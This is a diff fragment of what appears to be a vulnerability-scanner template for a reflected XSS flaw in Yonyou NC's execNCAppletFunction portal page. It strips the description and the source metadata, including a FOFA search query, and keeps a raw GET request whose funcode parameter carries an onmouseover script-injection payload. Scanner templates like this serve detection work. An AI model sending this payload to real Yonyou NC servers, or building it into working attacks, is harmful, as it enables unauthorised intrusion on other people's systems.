@@ -3,12 +3,8 @@ info:
   name: 用友NC execNCAppletFunction 存在XSS漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zafdz5d8g9hob3im'
+  description: ''
   tags: xss,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zafdz5d8g9hob3im
-    fofa: app="用友-UFIDA-NC"
 http:
 - raw:
   - 'GET /portal/pt/nc5x/fwd?pageId=login&funcode=1%27);%22%20onmouseover=%22alert(`xss`)%22%20x=%22&systemcode=1111 HTTP/1.1
